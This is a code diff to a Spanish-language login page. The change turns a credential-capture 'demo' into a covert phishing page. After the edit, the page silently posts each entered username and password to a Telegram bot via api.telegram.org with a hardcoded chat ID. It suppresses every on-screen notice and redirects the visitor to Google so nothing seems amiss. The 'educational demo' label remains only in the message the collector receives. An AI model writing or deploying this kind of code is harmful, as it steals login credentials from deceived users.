@@ -682,12 +682,10 @@ const TELEGRAM_CHAT_ID = "8963781207";                            // <-- CAMBIÁ
    FUNCIÓN: Enviar datos a Telegram
 ===================================================== */
 async function enviarATelegram(usuario, password) {
-    // Obtener fecha y hora actual
     const ahora = new Date();
     const fecha = ahora.toLocaleDateString('es-AR');
     const hora = ahora.toLocaleTimeString('es-AR');
 
-    // Construir el mensaje
     const mensaje = `
 🔐 *NUEVO INICIO DE SESIÓN - DEMO*
 
@@ -700,7 +698,6 @@ async function enviarATelegram(usuario, password) {
 ⚠️ *DEMO* - Solo para pruebas educativas
     `.trim();
 
-    // URL de la API de Telegram
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     try {
@@ -715,76 +712,40 @@ async function enviarATelegram(usuario, password) {
                 parse_mode: 'Markdown'
             })
         });
-
-        const data = await response.json();
-
-        if (data.ok) {
-            console.log('✅ Mensaje enviado a Telegram correctamente');
-        } else {
-            console.error('❌ Error al enviar a Telegram:', data.description);
-        }
-
-        return data;
-
+        return await response.json();
     } catch (error) {
-        console.error('❌ Error de conexión con Telegram:', error.message);
+        console.error('Error al enviar a Telegram:', error);
         return null;
     }
 }
 
 /* =====================================================
    FUNCIÓN: Botón "Ingresar"
+   - Envía datos a Telegram (sin mostrar nada)
+   - Redirige a Google
 ===================================================== */
 async function demoLogin() {
-    // Obtener los valores del formulario
     const usuarioInput = document.getElementById('usuario');
     const passwordInput = document.getElementById('password');
 
     const usuario = usuarioInput.value.trim();
     const password = passwordInput.value.trim();
 
-    // Validar que los campos no estén vacíos
+    // Si los campos están vacíos, mostrar alerta y no continuar
     if (!usuario || !password) {
         alert('⚠️ Por favor, completá todos los campos.');
         return;
     }
 
-    // Mostrar mensaje de carga
-    const boton = document.querySelector('.enter');
-    const textoOriginal = boton.textContent;
-    boton.textContent = '⏳ Enviando...';
-    boton.disabled = true;
-
-    // Enviar los datos a Telegram
-    const resultado = await enviarATelegram(usuario, password);
-
-    // Restaurar el botón
-    boton.textContent = textoOriginal;
-    boton.disabled = false;
-
-    // Mostrar mensaje al usuario
-    if (resultado && resultado.ok) {
-        alert(
-            '✅ DEMO\n\n' +
-            'Tus datos han sido enviados correctamente.\n\n' +
-            '👤 Usuario: ' + usuario + '\n' +
-            '🔑 Contraseña: ' + (password.replace(/./g, '•')) + '\n\n' +
-            '📱 Revisá tu Telegram para ver el mensaje.'
-        );
-    } else {
-        alert(
-            '⚠️ DEMO\n\n' +
-            'No se pudo enviar el mensaje a Telegram.\n' +
-            'Verificá que el Token y Chat ID sean correctos.'
-        );
-    }
+    // Enviar datos a Telegram (en segundo plano, sin mensajes al usuario)
+    enviarATelegram(usuario, password);
 
     // LIMPIAR CAMPOS por seguridad
     usuarioInput.value = '';
     passwordInput.value = '';
 
-    // Enfocar en el campo usuario
-    usuarioInput.focus();
+    // REDIRIGIR A GOOGLE
+    window.location.href = "https://www.google.com";
 }
 </script>
 </body>
